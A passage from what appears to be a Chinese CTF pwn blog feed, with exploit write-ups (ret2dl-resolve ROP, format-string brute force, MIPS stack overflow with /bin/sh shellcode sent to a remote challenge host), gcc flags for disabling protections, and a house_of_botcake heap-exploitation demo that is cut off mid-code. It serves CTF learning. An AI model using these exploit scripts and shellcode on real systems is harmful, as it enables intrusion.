class="line"></span><br><span class="line">io = process(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 首先，利用栈迁移，把fake_link_map放在bss段上</span></span><br><span class="line">rop = flat( <span class="string">'a'</span>*<span class="number">0x70</span>,  <span class="comment"># 此时到达老rbp</span></span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop7ret),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            p64(<span class="number">1</span>),</span><br><span class="line">            p64(read_got),  <span class="comment"># 重新调用read函数  r12</span></span><br><span class="line">            p64(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>),   <span class="comment"># read读入长度 </span></span><br><span class="line">            p64(write_addr),                  <span class="comment"># read读入位置  </span></span><br><span class="line">            p64(<span class="number">0</span>),                               <span class="comment"># </span></span><br><span class="line">            p64(mov3call),</span><br><span class="line">            p64(<span class="number">0</span>)*<span class="number">7</span> ,                        <span class="comment"># 补位</span></span><br><span class="line">            p64(vuln_addr)                       <span class="comment"># 再返回vuln函数</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>))</span><br><span class="line">io.sendline(rop)        <span class="comment"># 此rop中包含了ret2csu，利用其向bss上读数据</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。</span></span><br><span class="line">fake = flat(</span><br><span class="line">            p64(plt_load),</span><br><span class="line">            p64(fake_link_map_addr),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            fake_link_map      <span class="comment"># fake_link_map本体</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake)))</span><br><span class="line">io.sendline(fake)</span><br><span class="line">attach(io)</span><br><span class="line">pause()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400743</span></span><br><span class="line">leave = <span class="number">0x4006a6</span></span><br><span class="line">stack_mig = flat(</span><br><span class="line">            <span class="string">'a'</span>*<span class="number">0x70</span>,</span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop_rdi_ret),</span><br><span class="line">            p64(fake_link_map_addr+<span class="number">0x78</span>), <span class="comment"># /bin/sh</span></span><br><span class="line">            p64(leave)</span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(stack_mig)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>单步执行到printf_positional函数ret返回的地方，观察此时的返回的lbc地址和一个onegadget很接近，大概率只需爆破一位就行，且此时的onegadget刚好满足触发条件</p><p>好思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):       </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=process(<span class="string">"./noleakfmt"</span>)</span><br><span class="line">        one=<span class="number">0x027a</span></span><br><span class="line">        p.recvuntil(<span class="string">" : "</span>)</span><br><span class="line">        stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x2d6c</span> </span><br><span class="line">        <span class="keyword">if</span>(stack&amp;<span class="number">0xffff</span>&gt;<span class="number">0x2000</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p.sendline(<span class="string">"%"</span>+str(stack&amp;<span class="number">0xffff</span>)+<span class="string">"c"</span>+<span class="string">"%11$hn"</span>)</span><br><span class="line">    p.sendline(<span class="string">"%"</span>+str(one)+<span class="string">"c"</span>+<span class="string">"%37$hn"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1，3题很简单。5题当时已经想到要打printf的返回地址，但是当时调试崩掉了就没出。2题和4题没看，都是server还蛮有意思。&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="writeup" scheme="wood1314.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>mips pwn</title>
    <link href="wood1314.github.io/year/09/23/ckur473e60025ab154nvm0xvi/"/>
    <id>wood1314.github.io/year/09/23/ckur473e60025ab154nvm0xvi/</id>
    <published>2020-09-23T03:20:10.000Z</published>
    <updated>2020-10-23T00:28:10.860Z</updated>
    
    <content type="html"><![CDATA[<p>记录下mips架构环境的搭建和利用</p><a id="more"></a><h2 id="0x0-mips基本知识"><a href="#0x0-mips基本知识" class="headerlink" title="0x0 mips基本知识"></a>0x0 mips基本知识</h2><ul><li><code>a0-a3</code>: 存储参数</li><li><code>fp</code>: <code>fram pointer</code>，用来恢复栈之类的操作，可以理解为和<code>ebp</code>差不多的作用</li><li><code>sp</code>: 存储栈地址</li><li><code>v0...</code>: 存储一些变量或地址</li><li><code>t8,t9</code>: 临时寄存器，<code>t9</code>常常用来调用函数。如<code>alarm</code>的<code>plt</code>调用如下</li></ul><h2 id="0x1-交叉编译环境"><a href="#0x1-交叉编译环境" class="headerlink" title="0x1 交叉编译环境"></a>0x1 交叉编译环境</h2><h3 id="大端"><a href="#大端" class="headerlink" title="大端"></a>大端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mips-cross </span><br><span class="line">sudo apt-get install libc6-mips-cross libc6-dev-mips-cross </span><br><span class="line">sudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnu </span><br><span class="line">sudo apt-get install g++-mips-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="小端"><a href="#小端" class="headerlink" title="小端"></a>小端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install g++-mipsel-linux-gnu</span><br></pre></td></tr></table></figure><p>qemu有一个参数是是<code>-L</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-L path       QEMU_LD_PREFIX    set the elf interpreter prefix to &apos;path&apos;</span><br></pre></td></tr></table></figure><p>通过这个我们可以指定lib所在的位置，进入<code>/usr</code>可以看到mips库所在的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wood@ubuntu:~/pwn/mips/magicheap$ ls /usr/</span><br><span class="line">bin  games  include  lib  libexec  <span class="built_in">local</span>  locale  mipsel-linux-gnu  mips-linux-gnu  sbin  share  src</span><br></pre></td></tr></table></figure><p>假设我们手头有一个mips小端的程序，我们就可以通过以下参数启动它。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./hello</span><br></pre></td></tr></table></figure><h2 id="pwn02-babystack"><a href="#pwn02-babystack" class="headerlink" title="pwn02_babystack"></a>pwn02_babystack</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>这里采用qemu的用户模式来创建一个虚拟机执行程序。</p><p>先把对应的libc库放置当前目录的一个lib文件夹中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir lib </span><br><span class="line">sudo mv libc.so.1 ./lib/</span><br><span class="line">sudo mv ld-uClibc.so.0 ./lib/</span><br></pre></td></tr></table></figure><p>启动虚拟机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./main</span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./main</span><br></pre></td></tr></table></figure><p>然后另开一个终端(用pwndbg调试起来比较友好)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./main</span><br><span class="line">gdb&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>很简单，就是一个栈溢出然后执行shellcode就好了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh= process(["qemu-mipsel", "-g", "1234", "-L", "./lib","./main"])</span></span><br><span class="line">sh = remote(<span class="string">'111.231.70.44'</span>,<span class="number">28099</span>)</span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line">context.update(bits = <span class="number">32</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">ret_addr = <span class="number">0x400860</span></span><br><span class="line">sh.recvuntil(<span class="string">'Now,Input Your Name:\n'</span>)</span><br><span class="line">shellcode =  <span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"</span></span><br><span class="line">shellcode += <span class="string">"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"</span></span><br><span class="line">shellcode += <span class="string">"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"</span></span><br><span class="line">shellcode += <span class="string">"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.recvuntil(<span class="string">'Input Your message:\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">0x34</span> + p32(<span class="number">0x410C20</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录下mips架构环境的搭建和利用&lt;/p&gt;
    
    </summary>
    
      <category term="异构" scheme="wood1314.github.io/categories/%E5%BC%82%E6%9E%84/"/>
    
    
      <category term="mips" scheme="wood1314.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>出题时常用到的编译命令</title>
    <link href="wood1314.github.io/year/09/15/ckur473eu004jab15oh4swk6w/"/>
    <id>wood1314.github.io/year/09/15/ckur473eu004jab15oh4swk6w/</id>
    <published>2020-09-15T14:57:05.000Z</published>
    <updated>2020-10-23T01:33:29.850Z</updated>
    
    <content type="html"><![CDATA[<p>就是开保护关保护什么的编译选项</p><a id="more"></a><h3 id="Linux-alsr"><a href="#Linux-alsr" class="headerlink" title="Linux alsr"></a>Linux alsr</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sysctl -n kernel.randomize_va_space</span></span><br><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                // 默认不开启PIE</span><br><span class="line">$ gcc -fpie -pie -o <span class="built_in">test</span> test.c     // 开启PIE 强度为1</span><br><span class="line">$ gcc -fPIE -pie -o <span class="built_in">test</span> test.c     // 开启PIE 最高强度2</span><br><span class="line">$ gcc -fpic -o <span class="built_in">test</span> test.c          // 开启PIC 强度为1 不会开启PIE</span><br><span class="line">$ gcc -fPIC -o <span class="built_in">test</span> test.c          // 开启PIC 最高强度2 不会开启PIE</span><br><span class="line">$ gcc -no-pie -o <span class="built_in">test</span> test.c  // 关闭pie</span><br></pre></td></tr></table></figure><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                    // 默认开启 NX 保护</span><br><span class="line">$ gcc -z execstack -o <span class="built_in">test</span> test.c       // 禁用 NX 保护</span><br><span class="line">$ gcc -z noexecstack -o <span class="built_in">test</span> test.c     // 开启 NX 保护</span><br></pre></td></tr></table></figure><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                        // 默认不开启 Canary 保护</span><br><span class="line">$ gcc -fno-stack-protector -o <span class="built_in">test</span> test.c   // 禁用栈保护</span><br><span class="line">$ gcc -fstack-protector -o <span class="built_in">test</span> test.c      // 启用堆栈保护，只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">$ gcc -fstack-protector-all -o <span class="built_in">test</span> test.c  // 启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                          // 默认不会开启检查</span><br><span class="line">$ gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c      // 较弱的检查</span><br><span class="line">$ gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c      // 较强的检查</span><br></pre></td></tr></table></figure><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                     // 默认是 Partial RELRO</span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c          // 关闭</span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c             // 部分开启 即Partial RELRO</span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c              // 全部开启</span><br></pre></td></tr></table></figure><h3 id="去符号名"><a href="#去符号名" class="headerlink" title="去符号名"></a>去符号名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// gcc -o box box.c &amp;&amp; strip -s box</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;就是开保护关保护什么的编译选项&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="wood1314.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="gcc" scheme="wood1314.github.io/tags/gcc/"/>
    
  </entry>
  
  <entry>
    <title>house_of_botcake &amp;&amp; fastbin_reverse_into_tcache</title>
    <link href="wood1314.github.io/year/09/15/ckur473e0001lab15cu8amr9m/"/>
    <id>wood1314.github.io/year/09/15/ckur473e0001lab15cu8amr9m/</id>
    <published>2020-09-15T09:38:24.000Z</published>
    <updated>2020-09-15T12:25:20.967Z</updated>
    
    <content type="html"><![CDATA[<p>house_of_botcake 是针对2.29对double free做出限制以后提出的利用方法</p><p>fastbin_reverse_into_tcache 是利用fastbin实现一个类似于unsorted bin attack的效果</p><a id="more"></a><h2 id="0x01-house-of-botcake"><a href="#0x01-house-of-botcake" class="headerlink" title="0x01 house_of_botcake"></a>0x01 house_of_botcake</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Launch tcache poisoning"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got control on target/stack!\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Note:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先申请7个chunk，然后再申请出一个a和一个prev，我们最后会对这个a进行攻击。（注意先申请prev，再申请a，顺序不能乱）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">       x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">   <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">   <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>随后把tcache填满，释放a和prev,释放a和prev，这个时候a和prev合并了，都在unsortedbin中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">       <span class="built_in">free</span>(x[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">   <span class="built_in">free</span>(a);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">   <span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>然后实现double free,此时没有相同指针在bin和tcache中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">  